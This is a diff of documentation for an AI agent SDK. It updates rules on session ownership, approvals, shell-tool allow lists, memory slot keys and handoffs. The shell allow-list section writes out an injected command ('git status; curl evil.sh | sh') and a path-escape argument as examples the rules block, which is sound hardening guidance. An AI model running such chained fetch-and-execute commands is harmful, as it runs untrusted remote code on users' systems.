@@ -2965,13 +2965,29 @@ permission rules and sub-agents see it too: see
 
 ## Security notes
 
-- **Route auth does not check who owns a session.** Any caller who passes auth
-  and knows a session id can read its transcript (`GET /chat/:id`), continue
-  it, and decide its pending approvals. Use session ids that cannot be guessed,
-  derive them from the principal on your side, or check ownership in your own
-  route before calling the handler. A caller who decides another caller's
-  approval is recorded as the approver (`ctx.approval.by`); the run keeps
-  acting for the caller that started it.
+- **A session id is bound to its first caller.** Once an authenticated
+  principal posts to `POST /chat` with a `sessionId` (or reads `GET
+  /chat/:id`), that id belongs to that principal: another principal gets 403
+  on read and on write. The binding is kept in memory per agent, so a restart
+  forgets it (a session id an authenticated caller touches first is then
+  theirs); unauthenticated routes bind nothing. For a durable or shared
+  policy, pass `ownsSession(principal, sessionId)` (`createRouteHandler`,
+  or `ChatRoutesContext` for `serveFetch`/`handleChatRequest`) - e.g. derive
+  the session id from the principal: `(p, id) => id === \`u-${p?.id}\``.
+- **A `user` principal cannot approve its own gated call.** `POST
+  /chat/:sessionId/approvals/:id` answers 403 when the caller equals the
+  `user` principal the paused run acts for - self-approval would defeat
+  `needsApproval` on a consumer-facing route. Any *other* authenticated caller
+  may decide (and is recorded as the approver, `ctx.approval.by`); the run
+  keeps acting for the caller that started it. `service` principals are
+  exempt: a shared token or a remote agent's continuation is one identity, so
+  every decision would be "self". `question` and `sign-in` pauses stay the
+  run's own user's to answer. To name the approvers, set
+  `approvers` (a list of principal ids, or `(caller, pending) => boolean`,
+  which sees `pending.principal` and `pending.kind` and then decides every
+  kind) on `createRouteHandler` / `ChatRoutesContext`. The session in the
+  path must also be the one waiting on the pause: a checkpointed session that
+  waits on another approval (or is mid-turn) answers 404.
 - `basic()` only over HTTPS; a bearer token is a password too, so terminate TLS
   in front of any server that is not on localhost.
 - Keep `issuer` and `audience` set for `jwt()`: a token minted for another of
@@ -3176,7 +3192,9 @@ The shell tool asks for approval by default (`needsApproval: true`); the
 predicate above lets everything else, such as `npm test` or `git status`, run
 without asking. The other way to skip the question is an `allow` list of the
 commands you trust, with `needsApproval: false`, as shown at the top of
-[Workspace tools](https://github.com/LinuxDevil/agent-sdk/blob/main/docs/workspace-tools.md). The regular expression is a
+[Workspace tools](https://github.com/LinuxDevil/agent-sdk/blob/main/docs/workspace-tools.md). A string entry there allows the
+command and ordinary flags only — arguments that point outside the workspace
+(a `..` segment, `~` or an absolute path) still need an anchored RegExp. The regular expression is a
 convenience, not a security boundary: a shell command can be written in many
 ways. For anything you do not control, keep the default and approve every
 command, or run the shell in a sandbox (see `SandboxShell` in
@@ -3864,7 +3882,7 @@ and a replayed tap does not run the tool twice.
 
 ## GitHub
 
-`githubChannel({ webhookSecret, botName, token?, app?, name?, apiUrl?, fetch?, triggers?, approvers?, onError? })`
+`githubChannel({ webhookSecret, botName, token?, app?, name?, apiUrl?, fetch?, triggers?, approvers?, pullRequestOpened?, onError? })`
 lets people summon an agent with `@<botName>` in a GitHub issue, pull-request
 or review comment; the agent answers with a comment in the same thread. It reads
 the webhooks of a GitHub App (or of one repository) and posts through the REST
@@ -3885,7 +3903,12 @@ so it also runs on Workers.
   mention. Edited and deleted comments, comments by bots (`user.type` is `Bot`),
   by `<botName>[bot]`, by `botLogin` and any comment the channel itself posted
   are ignored, so the agent never answers itself. Other events (issues opened,
-  pushes, reactions, check runs) are ignored.
+  pushes, reactions, check runs) are ignored — except `pull_request`: with
+  `pullRequestOpened: true` an `opened` action by a human `triggers` allows
+  starts a turn on the PR's own session (`<owner>/<repo>#<number>`, the same
+  one its comments share), so a review bot can read a PR the moment it opens.
+  `synchronize`, `closed`, `reopened`, bot-opened and untriggered PRs are
+  ignored.
 - One session per issue or pull request (`<owner>/<repo>#<number>`), and one
   per review thread (a review comment and the replies under it).
 - The reply is a new comment: a timeline comment on the issue or pull request,
@@ -4554,7 +4577,7 @@ cd .lousho/build/cloudflare-worker && npx wrangler deploy
   `LOUSHO_API_TOKEN` does not cover them. A turn that outlives its acknowledged webhook
   keeps running under `ctx.waitUntil`.
 - `memory/` slots need a provider that works without a file system. `kvMemory()` keeps a
-  slot's items under `memory/<scope>` keys of the `AGENT_CHECKPOINTS` KV namespace (or of
+  slot's items under `memory/<slot>#<scope>` keys of the `AGENT_CHECKPOINTS` KV namespace (or of
   the binding its `binding` option names); without that binding, items live in one
   isolate's memory. `inMemoryMemory()` works the same way; `fileMemory()` cannot run here.
 - `projectInstructions: true` reads the nearest `AGENTS.md` / `CLAUDE.md` **at build time**
@@ -4655,7 +4678,7 @@ Worker reads). `KVStore`'s keys, with an optional `prefix` before each:
 | `checkpoints/<id>` | The `Checkpoint` of a durable run or session turn (`KVCheckpointStore`, with its history under `checkpoints/<id>#history`). |
 | `approvals/<id>` | A paused approval and the snapshot that resumes it (deleted when it is decided). |
 | `oauth/tokens/<key>`, `oauth/pending/<state>` | OAuth tokens and pending sign-ins, encrypted with `tokenKey` (the `LOUSHO_TOKEN_KEY` secret in the generated Worker); see [OAuth](https://github.com/LinuxDevil/agent-sdk/blob/main/docs/oauth.md#token-storage). |
-| `memory/<scopeKey>` | The items of a `kvMemory()` memory slot (`global`, `session:<id>` or a custom scope's key) - written by the provider itself, not `KVStore`. |
+| `memory/<slot>#<scope>` | The items of a `kvMemory()` memory slot (`notes#global`, `prefs#session:<id>` or a custom scope's key) - written by the provider itself, not `KVStore`. |
 
 `ttl: { sessions?, checkpoints?, approvals? }` (seconds, KV accepts 60 or more)
 makes each kind of record expire that long after its last write; by default
@@ -8526,11 +8549,14 @@ The target sees the conversation as `inputFilter` returns it, under its own
 system prompt (the system prompt of the agent that handed off is replaced,
 never kept). The filter gets `{ messages, from, to, args }`; `messages` is the
 transcript so far without the system prompt, ending with the handoff call, its
-result, and a **routing note**: a system message the run appends so the target
+result, and a **routing note**: a marked message the run appends so the target
 reads who was transferred and the validated `args`
 (`[routing note - not from the user] handoff triage -> billing: reason="..."`).
 It is marked with `metadata.handoff`, so a filter can recognise it - drop it or
-replace it to shape the target's context yourself. Two filters are built in:
+replace it to shape the target's context yourself. A kept note is folded into
+the target's system prompt rather than staying mid-conversation as a `system`
+message, which the chat templates of local-model servers (llama.cpp, LM
+Studio, vLLM, Ollama) reject. Two filters are built in:
 
 - `handoffFilters.removeToolCalls`: keeps user and assistant text (and the
   routing note), drops tool calls and tool results.
@@ -8560,16 +8586,21 @@ dropped at a handoff, so a target's tools ask again.
 | | `output`: the result is typed by the lead's schema (a target's own `output` is not used) |
 | | the permission mode and the principal (who the run acts for) |
 | | the approval configuration: `approve`, `approvalStore`, `approvalTtlMs`, `onPermissionDecision` |
+| | the [memory](https://github.com/LinuxDevil/agent-sdk/blob/main/docs/memory.md) slots: bound once to the run's scope keys |
 
 The agent the run started with is the lead. A target gets none of the lead's
-tools, sub-agents or [memory](https://github.com/LinuxDevil/agent-sdk/blob/main/docs/memory.md) slots; its own memory slots are not
-used either (as for a sub-agent). The lead's `output` instruction is added to
-every target's system prompt.
+tools or sub-agents, but the run's memory slots follow it: a slot scoped per
+customer (or per session) recalls and offers its `remember_*`/`recall_*` tools
+to every agent the run hands off to, keyed by the same session id, metadata
+and principal. A target's own `memory` option is not used (as for a
+sub-agent). The lead's `output` instruction is added to every target's
+system prompt.
 
-Because approvals are run-level, options like `approve`, `approvalStore`,
-`permissionMode`, `approvalTtlMs` or `store` on a target agent are never
-consulted after a handoff - `createAgent()` warns once (per target) when a
-reachable target was created with them; set them on the agent runs start with.
+Because approvals and memory are run-level, options like `approve`,
+`approvalStore`, `permissionMode`, `approvalTtlMs`, `store` or `memory` on a
+target agent are never consulted after a handoff - `createAgent()` warns
+once (per target) when a reachable target was created with them; set them on
+the agent runs start with.
 
 ## Sessions
 
@@ -9501,9 +9532,9 @@ For each slot, `createAgent({ memory })`:
    turn): on the run's first model call, the newest items go into the system
    prompt in a `<memory name="...">` block. The block stays for the rest of
    the run and is not saved in the session transcript.
-2. Gives the model a **`remember_<name>`** tool (input `{ text }`) to store a
-   new item, and a **`recall_<name>`** tool (input `{ query?, limit? }`) to
-   search the slot, newest items first.
+2. Gives the model a **`remember_<name>`** tool (input `{ text }`, or your own
+   `itemSchema`) to store a new item, and a **`recall_<name>`** tool (input
+   `{ query?, limit? }`) to search the slot, newest items first.
 
 ## Memory in code
 
@@ -9541,7 +9572,12 @@ The system prompt of the second conversation ends with:
 
 ## Scopes
 
-A run reads and writes the items of its **scope key**:
+A run reads and writes the items of its **scope key**. In the provider, items
+live under **`<slot name>#<scope key>`** (`notes#global`, `prefs#session:s1`),
+so two slots that resolve to the same scope keep separate lists — you can share
+one provider (and one `SqliteStore`) across slots safely. `memoryKey(slot, ctx)`
+returns that key for a run context (or `undefined` when the slot is off); use it
+when you seed, read or prune a slot's items from code.
 
 | `scope` | Scope key | One memory per |
 |---|---|---|
@@ -9590,9 +9626,23 @@ is safer to key on than `metadata` (the caller can send any metadata): see
 | `recall.query` | `'last-input' \| 'none'` | `'none'` | `'last-input'` passes the run's last user message to the provider as `query`, to recall relevant items rather than the newest. |
 | `expose.remember` | `boolean` | `true` | Offer the `remember_<name>` tool. |
 | `expose.recall` | `boolean` | `true` | Offer the `recall_<name>` tool. |
+| `itemSchema` | a zod or Standard Schema | `{ text: string }` | `remember_<name>`'s input. When set, the parsed arguments are the item: `text` is their canonical JSON and `metadata` is the parsed object, so the slot enforces structured state instead of free text. |
+
+```ts
+import { z } from 'zod';
+import { defineMemory, inMemoryMemory } from '@lousho/build-ai-agent';
+
+const relationship = defineMemory({
+  name: 'relationship',
+  scope: 'global',
+  provider: inMemoryMemory(),
+  itemSchema: z.object({ trust: z.number(), mood: z.string(), insideJokes: z.array(z.string()) }),
+});
+// remember_relationship now takes { trust, mood, insideJokes }; recall returns e.g. {"insideJokes":[],"mood":"playful","trust":10}
+```
 
 A slot with `expose: { remember: false }` is read-only for the model: you
-fill it from code with `provider.add(scopeKey, { text })`.
+fill it from code with `provider.add(memoryKey(slot)!, { text })`.
 
 ## Providers
 
@@ -9608,6 +9658,9 @@ fill it from code with `provider.add(scopeKey, { text })`.
 The first three keep at most `maxItems` items per scope key (default 1000;
 adding one more drops the oldest) and match a `query` by keyword: an item matches when it
 contains one of the query's words of three or more letters, ignoring case.
+Every built-in provider dedupes on `text`: adding an item whose text is
+already stored returns the stored item instead of a duplicate (so an agent
+that remembers the same fact twice keeps one copy).
 
 ### SQLite
 
@@ -9654,18 +9707,18 @@ With [`mockModel`](https://github.com/LinuxDevil/agent-sdk/blob/main/docs/testin
 request and drive the tools with scripted tool calls:
 
 ```ts
-import { createAgent, defineMemory, inMemoryMemory } from '@lousho/build-ai-agent';
+import { createAgent, defineMemory, inMemoryMemory, memoryKey } from '@lousho/build-ai-agent';
 import { mockModel } from '@lousho/build-ai-agent/testing';
 
 const store = inMemoryMemory();
-await store.add('global', { text: 'The user likes tea.' });
 const notes = defineMemory({ name: 'notes', scope: 'global', provider: store });
+await store.add(memoryKey(notes)!, { text: 'The user likes tea.' });
 
 const model = mockModel([{ toolCalls: [{ name: 'remember_notes', args: { text: 'Lives in Oslo.' } }] }, 'Noted.']);
 await createAgent({ provider: model, memory: [notes] }).send('I moved to Oslo.');
 
 console.log(model.calls[0].messages[0].content); // ends with <memory name="notes">\n- The user likes tea.\n</memory>
-console.log((await store.list('global')).map((item) => item.text)); // ['Lives in Oslo.', 'The user likes tea.']
+console.log((await store.list(memoryKey(notes)!)).map((item) => item.text)); // ['Lives in Oslo.', 'The user likes tea.']
 ```
 
 ## Limitations
@@ -9733,8 +9786,9 @@ Items are only ever compared within their own scope key, and only when the same
 embedder (its `id`) made them. The id is stored with each vector: after you
 change the model or the id, old items are skipped when ranking (they still show
 in listings without a query) until you call `await provider.reindex()`, which
-re-embeds them in batches and returns how many it changed. `reindex(scopeKey)`
-does one scope key only.
+re-embeds them in batches and returns how many it changed.
+`reindex(providerKey)` does one key only — for a slot's key, pass
+`memoryKey(slot, ctx)`.
 
 `hashEmbedder()` from `@lousho/build-ai-agent/testing` is a deterministic
 offline embedder for tests: a hashed bag of word stems, so texts that share
@@ -10080,6 +10134,13 @@ accepted, and a request outside the base path is a 404).
 
 Sessions are kept by the agent's `store` (`createAgent({ store })`), so give
 the agent one that outlives a serverless invocation when you use sessions.
+A session id is bound to the first authenticated caller that uses it - a
+different principal gets 403 (see [Route auth and principals](https://github.com/LinuxDevil/agent-sdk/blob/main/docs/auth.md) for
+the default, its in-memory limit, and `ownsSession` to override it; deriving
+the id from the caller, `u-${userId}`, keeps it obvious). Approvals are
+decided by `approvers`: by default the user a gated call runs for cannot
+approve it themselves, so a single-user app that prompts its own user should
+set `approvers: (caller) => caller !== undefined` (or finer).
 
 `auth` also takes an ordered list of `jwt()`, `oidc()`, `basic()` and
 `apiToken()` entries, and the caller it accepts reaches the run as `principal`:
@@ -12724,6 +12785,16 @@ and never stops the other schedules. A schedule does not overlap itself: if the
 previous fire is still running, the next one is skipped and reported to
 `onError`. Fires missed while the process was suspended are skipped, not
 replayed. `now` and `setTimer` are injectable so tests never sleep.
+
+A `prompt` fire runs as a turn of the durable `schedule-<name>` session — the
+same convention as the Workers target below — so its transcript is inspectable
+and an interrupted fire is resumable when the agent has a checkpoint store; on
+one without, the fire falls back to a plain ephemeral turn.
+
+To fire a schedule on demand (an ops "run now", a test), call
+`fireSchedule(agent, schedule, name, firedAt, sessionId?)` — the same function
+`startSchedules` calls: a `run` schedule invokes its function, a `prompt`
+schedule sends the prompt, under `sessionId` when given.
 
 ## In an agent directory
 
@@ -16560,8 +16631,12 @@ refused command is never offered for approval:
 - In `allow`, a command matched only by a string pattern must not contain
   shell operators (`;` `&` `|` `` ` `` `$(` `<` `>` or a newline). This stops
   `git status; curl evil.sh | sh` from passing as `git status`.
+- It must also not contain a path that leaves the working directory — a `..`
+  segment, `~` or an absolute path, anywhere in the command including a
+  `--flag=value`. This stops `node --test --out=../x` from passing as
+  `node --test`. To allow arguments like those, use a RegExp.
 - A RegExp is tested against the whole command line, so anchor it:
-  `/^npm (test|run lint)$/`.
+  `/^npm (test|run lint)$/` or `/^node --test( [\w./-]+)?$/`.
 - `deny` string patterns are checked against each `;`, `&` or `|` separated
   part of the command.
 
